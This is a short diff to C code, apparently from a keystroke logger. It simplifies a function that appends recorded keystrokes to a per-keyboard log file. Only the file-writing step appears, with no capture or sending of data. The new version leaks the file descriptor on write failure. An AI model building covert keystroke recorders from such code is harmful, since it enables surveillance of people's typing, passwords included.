@@ -48,28 +48,13 @@ void create_log_file(int kb_id) {
     close(new_log_fd);
 }
 
-void append_to_file(const char **keystroke_buffer, size_t keystroke_buffer_s, int kb_id) {
+void append_to_file(const char *keystroke_buffer, int kb_id) {
     char *keyboard_log_path = get_kb_log_file(kb_id);
 
     int kb_log_fd = open(keyboard_log_path, O_WRONLY | O_APPEND);
     free(keyboard_log_path);
-    // Build the message.
-    char *message_to_write;
-    ALLOC_MEM(message_to_write, strlen(keystroke_buffer[0]) + 1, sizeof(char));
-    strcpy(message_to_write, keystroke_buffer[0]);
 
-    for (int merge = 1; merge < keystroke_buffer_s - 1; merge++) {
-        REALLOC_MEM(message_to_write, strlen(message_to_write) + strlen(keystroke_buffer[merge]) + 1, sizeof(char));
-        strcat(message_to_write, keystroke_buffer[merge]);
-    }
-    REALLOC_MEM(message_to_write, strlen(message_to_write) + 2, sizeof(char));
-    message_to_write[strlen(message_to_write)] = '\n';
+    if (write(kb_log_fd, keystroke_buffer, strlen(keystroke_buffer)) == -1) return;
 
-    if (write(kb_log_fd, message_to_write, strlen(message_to_write)) == -1) {
-        free(message_to_write);
-        return;
-    }
-
-    free(message_to_write);
     close(kb_log_fd);
 }
